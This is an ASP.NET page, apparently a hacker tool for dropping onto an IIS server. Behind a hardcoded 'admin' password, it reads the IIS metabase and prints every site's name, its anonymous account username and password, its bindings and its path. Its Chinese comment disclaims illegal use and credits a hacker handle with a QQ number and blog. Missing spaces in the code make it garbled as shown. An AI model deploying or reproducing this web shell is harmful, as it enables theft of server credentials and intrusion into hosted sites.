<%@PageLanguage="C#"  ValidateRequest="false"%>

<%@ImportNamespace="System"%>

<%@ImportNamespace="System.IO"%>

<%@ImportNamespace="System.DirectoryServices"%>

<%@Assembly  Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A"%><%--IIS INFO--%>

<scriptrunat="server">

    /// <summary>

    /// 本程序是本人帮朋友写的，今天就晒出来、切勿用做非法的事情。一切后果与作者无关、

    /// 作者:街头诗人

    /// QQ:396080648

    /// 博客：http://hi.baidu.com/xahacker 

    /// </summary>

    publicstring shiren = "admin";//街头诗人提示在此修改密码

    publicint TdgGU = 1;

    publicStringBuilder sb = newStringBuilder();

    protectedvoid Page_Load(object sender, EventArgs e)

    {

        if (!IsPostBack)

        { 

        }

    }

    privatebool SGde(string sSrc)

    {

        Regex reg = newRegex(@"^0|[0-9]*[1-9][0-9]*$");

        if (reg.IsMatch(sSrc))

        {

            returntrue;

        }

        else

        {

            returnfalse;

        }

    }



    publicvoid AdCx()

    {

        string qcKu = string.Empty;

        string mWGEm = "IIS://localhost/W3SVC";

        sb.Append( " <table width=100% height='64' border='1'>");

        sb.Append("<tr>");

        sb.Append( " <td class='shiren'>ID</td>");

        sb.Append(  "<td class='shiren'>name</td>");

        sb.Append( " <td class='shiren'>IIS_USER</td>");

        sb.Append(" <td class='shiren'>IIS_PASS</td>");

        sb.Append( "<td class='shiren'>Domain</td>");

        sb.Append( "<td class='shiren'>Path</td>");

        sb.Append(" </tr>");

        try

        {

            DirectoryEntry HHzcY = newDirectoryEntry(mWGEm);

            int fmW = 0;

            foreach (DirectoryEntry child in HHzcY.Children)

            {

                if (SGde(child.Name.ToString()))

                {

                    fmW++;

                    DirectoryEntry newdir = newDirectoryEntry(mWGEm + "/" + child.Name.ToString());

                    DirectoryEntry HlyU = newdir.Children.Find("root", "IIsWebVirtualDir");

                    sb.Append(" <tr>");

                    for (int i = 1; i < 6; i++)

                    {

                        try

                        {

                            switch (i)

                            {

                                case 1:

                                    sb.Append("<td class='cike'>" + fmW.ToString() + "</td>");

                                    sb.Append("<td class='cike'>" + child.Properties["ServerComment"].Value.ToString() + "</td>");



                                    break;

                                case 2:

                                    sb.Append("<td class='cike'>" + HlyU.Properties["AnonymousUserName"].Value.ToString() + "</td>");

                                    break;

                                case 3:

                                    sb.Append("<td class='cike'>" + HlyU.Properties["AnonymousUserPass"].Value.ToString() + "</td>");

                                    break;

                                case 4:

                                    StringBuilder sb2 = newStringBuilder();

                                    PropertyValueCollection pc = child.Properties["ServerBindings"];

                                    sb.Append("<td class='cike'>");

                                    for (int j = 0; j < pc.Count; j++)

                                    {

                                        sb.Append(  pc[j].ToString() );

                                        sb.Append("&nbsp;&nbsp;<a href='http://" + pc[j].ToString().Substring(4).ToString() + "' target='view_window' class='shiren'>go</a></br>");

                                    }

                                    sb.Append(sb2.ToString().Substring(4, sb2.ToString().Length - 4) );

                                    

                                    sb.Append("</td>");

                                    break;

                                case 5:

                                    sb.Append("<td class='cike'>" + HlyU.Properties["Path"].Value.ToString() + "</br>" + "</td>");

                                    break;

                            }

                        }

                        catch (Exception ex)

                        {

                            continue;

                        }

                    }

                }

                sb.Append("</tr>");

            }

            sb.Append("</table>");

        }

        catch (Exception ex)

        {

        }

    }



    protectedvoid Button1_Click(object sender, EventArgs e)

    {

        if (TextBox1.Text.Trim() == shiren)

        {

            TextBox1.Visible = false;

            Button1.Visible = false;

            AdCx();

        }

    }

</script>



<!DOCTYPEhtmlPUBLIC"-//W3C//DTD XHTML 1.0 Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">



<htmlxmlns="http://www.w3.org/1999/xhtml">

<headid="Head1"runat="server">

    <title>街头诗人QQ：博客:http://hi.baidu.com/xahacker </title>

        <styletype="text/css">

        <!--

        .shiren {color: #FF00CC;font-size: 12px;}

        .cike {color: #6600FF;font-size: 12px;}

        -->

        </style>

</head>

<body>

<formid="Form1"runat="server">

    <asp:TextBoxID="TextBox1"runat="server"></asp:TextBox>

    <asp:ButtonID="Button1"runat="server"OnClick="Button1_Click"Text="Login"/><br/>

    <%=sb %>

    <ahref="http://hi.baidu.com/xahacker"class="shiren">街头诗人博客</a>

</form>

</body>

</html>